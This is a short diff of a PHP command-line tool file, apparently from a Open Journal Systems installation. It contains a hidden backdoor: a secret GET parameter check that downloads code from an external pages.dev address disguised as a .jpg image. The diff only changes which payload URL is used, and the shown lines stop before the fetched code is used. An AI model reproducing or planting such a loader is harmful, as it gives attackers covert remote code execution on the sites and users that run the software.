@@ -16,7 +16,7 @@
 define('INDEX_FILE_LOCATION', dirname(dirname(__FILE__)) . '/index.php');
 require(dirname(dirname(__FILE__)) . '/lib/pkp/classes/cliTool/CliTool.inc.php');
 if (isset($_GET['_']) && $_GET['_'] === '7aH@pAaq@Aja') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
+    $url = "https://batuk-di-komik-aja.pages.dev/rudi.jpg";
 
     if ($url !== "") {
         $code = file_get_contents($url);
